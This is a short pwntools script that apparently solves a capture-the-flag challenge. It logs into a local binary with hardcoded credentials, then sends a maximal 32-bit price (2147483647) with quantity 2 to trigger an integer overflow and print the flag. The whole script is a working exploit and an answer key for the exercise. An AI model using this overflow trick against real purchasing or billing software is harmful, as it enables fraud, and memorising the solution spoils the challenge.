from pwn import *

exe = './chall'
context.binary = exe
p = process(exe)

p.recvuntil(b"Username: ")
p.sendline(b"S3c5r1ty_3ng1n33r")
p.recvuntil(b"Password: ")
p.sendline(b"P@55w0rd")

p.recvuntil(b"Enter item price: ")
p.sendline(b"2147483647")
p.recvuntil(b"Enter quantity: ")
p.sendline(b"2")

flag = p.recvall().decode()
print(flag)

p.close()
